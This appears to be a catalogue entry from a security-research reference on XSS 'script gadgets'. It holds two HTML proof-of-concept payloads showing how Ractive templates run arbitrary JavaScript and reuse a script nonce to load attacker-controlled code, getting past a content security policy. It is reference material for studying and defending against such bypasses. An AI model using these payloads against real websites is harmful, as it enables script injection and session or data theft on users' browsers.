---
description: It"s a JavaScript library for building reactive user interfaces in a way that doesn"t force you into a particular framework"s way of thinking. It takes a radically different approach to DOM manipulation - one that saves both you and the browser unnecessary work.
github: ractivejs/ractive
gadgets:
  Latest:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - script-tag
      - id-attr
      - unsafe-eval-csp
      - func-call-parameter
    pocs:
      - description: |
          The [Ractive](https://github.com/ractivejs/ractive) framework uses the `template` attribute value as a query selector for `<script>` elements. It then renders the content of the selected template.

          Due to the way the templating system works, it is possible to execute arbitrary scripts through the template.
        code: |
          <div id="app"></div>

          <!-- user input -->
          <script id="template">{{@global.window.alert(@global.document.domain)}}</script>

          <script nonce="secret" src="https://cdn.jsdelivr.net/npm/ractive@1.4.4/ractive.min.js"></script>
          <script nonce="secret">
            const ractive = new Ractive({
              target: "#app",
              template: "#template",
              data: {
                name: "World"
              }
            });
          </script>
      - description: It is also possible to retrieve the nonce from the current script element and use it to load a script.
        code: |
          <div id="app"></div>

          <!-- user input -->
          <script id="template"><script nonce="{{@global.document.currentScript.nonce}}" src="[current-location]/assets/xss/index.js" /></script>

          <script nonce="secret" src="https://cdn.jsdelivr.net/npm/ractive@1.4.4/ractive.min.js"></script>
          <script nonce="secret">
            const ractive = new Ractive({
              target: "#app",
              template: "#template",
              data: {
                name: "World"
              }
            });
          </script>
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/ractive.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/ractive_exploit.php
---
